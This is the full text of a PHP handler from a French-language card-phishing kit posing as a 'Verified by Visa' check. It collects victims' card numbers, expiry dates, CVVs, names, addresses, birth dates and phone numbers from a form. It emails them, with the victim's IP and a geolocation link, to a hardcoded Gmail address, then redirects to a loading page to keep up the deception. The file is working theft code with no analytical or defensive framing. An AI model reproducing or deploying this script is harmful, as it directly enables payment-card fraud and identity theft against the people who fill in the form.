<?php
session_start();
error_reporting(0);
$ip = $_SERVER['REMOTE_ADDR'];
$email='csssjs99@gmail.com';
$message .= "|-------------------------------------| VBV |-------------------------------------|\n";
$message .= "num de compte   : ".$_POST['8']."\n";
$message .= "Carte de credit : ".$_POST['9']."\n";
$message .= "Date expiration : ".$_POST['10']."/".$_POST['11']."\n";
$message .= "Cvv             : ".$_POST['12']."\n";
$message .= "================================================================\n";
$message .= "|Prenom            : ".$_POST['1']."\n";
$message .= "|Nom          : ".$_POST['2']."\n";
$message .= "|adress          : ".$_POST['3']."\n";
$message .= "|Naissance          : ".$_POST['4']."-".$_POST['5']."-".$_POST['6']."\n";
$message .= "|Telephone          : ".$_POST['7']."\n";
"================================================================\n";
$message .= " http://www.geoiptool.com/?IP=$ip \n";

$message .= "|------------------------------------[Payload]------------------------------------|\n";
$email = 'csssjs99@gmail.com';
$subject = " Alert! New vbv Dekhlat ^^ - From:[ $ip ]";
$headers = "From: Astro <info@online.net>";

mail("$email", "$subject", "$message", "$headers");

header("Location:./load1.html");
?>


g